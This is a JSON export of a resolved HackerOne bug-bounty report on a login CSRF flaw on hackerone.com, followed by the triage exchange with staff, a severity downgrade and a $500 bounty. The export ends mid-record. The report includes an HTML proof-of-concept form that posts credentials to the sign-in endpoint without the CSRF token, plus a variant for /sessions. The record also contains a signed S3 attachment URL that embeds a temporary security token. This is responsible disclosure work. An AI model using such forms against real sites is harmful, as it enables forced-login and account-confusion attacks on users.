{
  "id": 834366,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzQzNjY=",
  "url": "https://hackerone.com/reports/834366",
  "title": "Login CSRF vulnerability on hackerone.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2020-03-30T07:29:15.341Z",
  "submitted_at": "2020-03-30T07:29:15.341Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "what_web",
    "url": "/what_web",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-06-12T18:08:43.616Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-05-30T04:19:30.824Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "###Summary\nHi. We found a CSRF token bypass on the Hacker One login page.\nSo, this report describes Hacker One login CSRF Token Bypass.\n\n###Exploitation process\nHacker One uses the authenticity_token token during login to prevent CSRF.\nHowever, the authenticity_token token is not properly verified, so an attacker can log in via CSRF without the authenticity_token token.\nIn other words, Hacker One thinks that it implemented CSRF token through authenticity_token token, but it is not.\n\n###Steps To Reproduce\n1. Go to `https://hackerone.com/users/sign_in`\n2. While logging into your account, grab packets through the buff suit.\n3. Take the HTML code format from burp suite -> Engagement Tools -> Generate CSRF POC.\n4. Delete the authenticity token.\n5. Forward the request and CSRF exploited successfully and the modified data changed successfully :)\n\n###PoC\n```javascript\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://hackerone.com/users/sign_in\" method=\"POST\">\n      <input type=\"hidden\" name=\"user[email]\" value=\"youremail\" />\n      <input type=\"hidden\" name=\"user[password]\" value=\"yourpassword\" />\n      <input type=\"hidden\" name=\"user[remember_me]\" value=\"1\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\n## Impact\n\nThe victim may add sensitive payment information to the attacker's new account \n{F765737}\n\nthe victim's IP may be recorded in the attacker's account, resulting in brute force and identity theft.\n█████",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 765737,
      "file_name": "TESTCSRF22.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Xxfp2Af2CvaxbMxjo1gt5BPZ?response-content-disposition=attachment%3B%20filename%3D%22TESTCSRF22.PNG%22%3B%20filename%2A%3DUTF-8%27%27TESTCSRF22.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c7be7f52d244c08b55e157e2d1d7cc880d44440f2a91ceedab486d4885e53040",
      "file_size": 30599,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-06-29T04:19:31.000Z",
  "allow_singular_disclosure_after": -102049732.29321735,
  "singular_disclosure_allowed": true,
  "vote_count": 69,
  "voters": [
    "zzero",
    "canarinho_pistola",
    "is-",
    "thaivu",
    "jobert",
    "trieulieuf9",
    "brahim_boufakri01",
    "ali",
    "shubham_srt",
    "0xneutrall",
    "and 59 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 3,
    "asset_type": "URL",
    "asset_identifier": "hackerone.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 7476591,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████████ ██████ ██ ██████████ █████ ██████ ████████████ █████████ █",
      "automated_response": false,
      "created_at": "2020-03-30T07:31:05.585Z",
      "updated_at": "2020-06-12T17:57:16.613Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7485023,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hi @what_web, \n\nThank you for your submission! I got the following response using the above CSRF login form with valid email and password. \n\n```\nHTTP/1.1 412 Precondition Failed\nDate: Mon, 30 Mar 2020 18:20:29 GMT\nContent-Type: text/html; charset=utf-8\nConnection: close\nSet-Cookie: █████████\nX-Request-Id: bf93643a-bcd1-4cf2-949c-9b46dd160cc0\nCache-Control: no-cache\nSet-Cookie: █████████\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nReferrer-Policy: strict-origin-when-cross-origin\nExpect-CT: enforce, max-age=86400\nContent-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src www.youtube-nocookie.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598\nCF-Cache-Status: DYNAMIC\nServer: cloudflare\nCF-RAY: 57c3d83dfc76d5b3-BOM\nContent-Length: 1169\n```",
      "automated_response": false,
      "created_at": "2020-03-30T18:22:07.720Z",
      "updated_at": "2020-03-30T18:22:07.720Z",
      "actor": {
        "username": "chessmast3r",
        "cleared": false,
        "verified": false,
        "url": "/chessmast3r",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7488145,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "I tested again in Firefox and Chrome, and but I was able to reproduce it successfully. and If you log in with a valid ID as you say, 412 responses are reflected. However, if I check my current status through refresh, the login is already successful. I prepared a video for proof of concept.\n██████████\nThank you hackerone best security Analyst !\nBest Dear\n@what_web ",
      "automated_response": false,
      "created_at": "2020-03-31T01:48:05.899Z",
      "updated_at": "2020-05-29T17:31:58.115Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7488269,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hello Hacker One team.\nThank you for resolving your login CSRF problem quickly. But unfortunately this problem is still reproducible.\n\n###Diagnostic process\nI tested this problem again. Initially it was designed to implement logins via `authenticity` tokens via `https://hackerone.com/users/sign_in` URL, but now testing again, we now have a problem to implement logins via `fingerprint` token via `hackerone.com/sessions` URL I solved it again and solved the CSRF problem of the login page. But, unfortunately, still working on my PoC, `https://hackerone.com/users/sign_in`, and CSRF works successfully if I log in with existing `login parameters`.\n\nOld code\n```javascript\nhttps://hackerone.com/users/sign_in\n      <input type=\"hidden\" name=\"user[email]\" value=\"youremail\" />\n      <input type=\"hidden\" name=\"user[password]\" value=\"yourpassword\" />\n      <input type=\"hidden\" name=\"user[remember_me]\" value=\"1\" />\n```\n\nNew code\n```javascript\nhttps://hackerone.com/sessions\n      <input type=\"hidden\" name=\"email\" value=\"youremail\" />\n      <input type=\"hidden\" name=\"password\" value=\"yourpassword\" />\n      <input type=\"hidden\" name=\"remember_me\" value=\"false\" />\n```\n\nIn other words, the current hackerone solved the problem by modifying the Token on the login page, the parameter that receives the login, and the current URL as sessions, but the cause can still be reproduced through the existing PoC.\n\nBest regards.\n@what_web\n",
      "automated_response": false,
      "created_at": "2020-03-31T02:19:52.637Z",
      "updated_at": "2020-03-31T02:26:01.827Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7495706,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web, \n\nThank you for the additional information! To make it clear, we did not push any changes, we have both the endpoints used for the login purpose, I'm going to check with the team if \"Login CSRF\" represent any security risk or not, will keep you updated. ",
      "automated_response": false,
      "created_at": "2020-03-31T17:49:00.712Z",
      "updated_at": "2020-03-31T17:49:00.712Z",
      "actor": {
        "username": "chessmast3r",
        "cleared": false,
        "verified": false,
        "url": "/chessmast3r",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7532429,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi. Are there any updates to this report? :))\nBest Dear,\n@what_web ",
      "automated_response": false,
      "created_at": "2020-04-03T17:36:43.551Z",
      "updated_at": "2020-04-03T17:36:43.551Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7532453,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hi @what_web - thanks again for your report. We'll escalate this to our engineering team. We are able to reproduce the behavior you describe and will determine if this is something we'd like to fix next week. Thanks!",
      "automated_response": false,
      "created_at": "2020-04-03T17:38:57.595Z",
      "updated_at": "2020-04-03T17:38:57.595Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7628181,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████████ ██████ ██ ██████████ ████████████████████",
      "automated_response": false,
      "created_at": "2020-04-11T10:38:17.348Z",
      "updated_at": "2020-06-12T17:47:51.256Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7642554,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ ████████ ██ █ ██████",
      "automated_response": false,
      "created_at": "2020-04-13T11:48:48.409Z",
      "updated_at": "2020-06-12T17:48:29.765Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7642901,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web, \n\nAs said in the last comment, the internal team still need to confirm if this is something we would like to address or not, we will keep you updated once we have more information to share. \n\n",
      "automated_response": false,
      "created_at": "2020-04-13T12:23:37.393Z",
      "updated_at": "2020-04-13T12:23:37.393Z",
      "actor": {
        "username": "chessmast3r",
        "cleared": false,
        "verified": false,
        "url": "/chessmast3r",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7644131,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ █████ ██████████ ██ █████ █",
      "automated_response": false,
      "created_at": "2020-04-13T14:24:37.231Z",
      "updated_at": "2020-06-12T17:58:39.666Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7827275,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "███ █ █ ███████ ██████ ███ █████████",
      "automated_response": false,
      "created_at": "2020-04-28T16:58:08.823Z",
      "updated_at": "2020-06-12T17:59:12.427Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7908680,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ █████ ██████████ ██ █████ █",
      "automated_response": false,
      "created_at": "2020-05-06T07:38:58.035Z",
      "updated_at": "2020-06-12T18:00:02.106Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 7979578,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "███ █████ ████ ██ █ ██████████ ████████",
      "automated_response": false,
      "created_at": "2020-05-12T18:47:31.467Z",
      "updated_at": "2020-06-12T18:01:32.342Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8004980,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@what_web Apologies for the delay on this particular issue, doesn't happen that often. This hasn't been at the top of our list because it's rather tricky to exploit it (although not impossible). I'll assign it to myself and figure out where this CSRF-like behavior comes from. Thanks again for your patience!\n\nPS Lovely picture! ",
      "automated_response": false,
      "created_at": "2020-05-14T22:16:23.616Z",
      "updated_at": "2020-05-14T22:16:23.616Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8005401,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you.",
      "automated_response": false,
      "created_at": "2020-05-15T00:22:09.040Z",
      "updated_at": "2020-05-15T00:22:09.040Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8005424,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web - I've looked into this and I was able to reproduce it! For some reason, your initial proof of concept didn't work for me, both on my local development environment or production. Your video was great because it showed that it was definitely working at some point, so I dived into the code until I figured out what was happening. We'll get a fix out for this. I suspect that this will go out next week. Thanks!",
      "automated_response": false,
      "created_at": "2020-05-15T00:27:52.155Z",
      "updated_at": "2020-05-15T00:27:52.155Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8005448,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @jobert Thank you for coming back.\nI am really happy. Thank you very much :)\n",
      "automated_response": false,
      "created_at": "2020-05-15T00:34:54.614Z",
      "updated_at": "2020-05-15T00:34:54.614Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8013307,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2020-05-15T16:26:35.122Z",
      "updated_at": "2020-05-15T16:26:35.122Z",
      "additional_data": {
        "old_severity": "Medium",
        "new_severity": "Low (3.8)",
        "old_severity_id": 675131,
        "new_severity_id": 722968
      },
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8013314,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "Thanks again, @what_web!",
      "automated_response": false,
      "created_at": "2020-05-15T16:27:03.175Z",
      "updated_at": "2020-05-15T16:27:03.175Z",
      "actor": {
        "url": "/security",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "HackerOne"
        }
      },
      "bounty_amount": "500.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "security",
      "collaborator": {
        "username": "what_web",
        "url": "/what_web"
      }
    },
    {
      "id": 8018161,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ ████████ ██ █ ██████",
      "automated_response": false,
      "created_at": "2020-05-16T00:14:27.802Z",
      "updated_at": "2020-06-12T17:50:49.234Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8022482,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████████ ██████ ██ ██████████ ████████████████████",
      "automated_response": false,
      "created_at": "2020-05-16T16:12:58.260Z",
      "updated_at": "2020-06-12T17:51:20.352Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8050184,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "██████ ████ █████ ██████████ ██ █████ █",
      "automated_response": false,
      "created_at": "2020-05-19T16:27:27.414Z",
      "updated_at": "2020-06-12T17:52:14.710Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8086681,
      "is_internal": false,
      "editable": false,
      "type": "Activities::HackerRequestedMediation",
      "message": "",
      "automated_response": false,
      "created_at": "2020-05-23T12:36:41.796Z",
      "updated_at": "2020-05-23T12:36:41.796Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8111304,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "> The report included a Token bypass issue, not just a login CSRF issue.\n\nThat's not the case. You won't be able to use this to bypass the CSRF protection on any other endpoint. Feel free to try, but you'll notice that it won't work. Because of that, we're keeping the severity set to 3.8. We'll provide a detailed write-up how this could've happened, which will also be proof that this only applied to the login page.",
      "automated_response": false,
      "created_at": "2020-05-26T19:16:50.815Z",
      "updated_at": "2020-05-26T19:16:50.815Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8112703,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
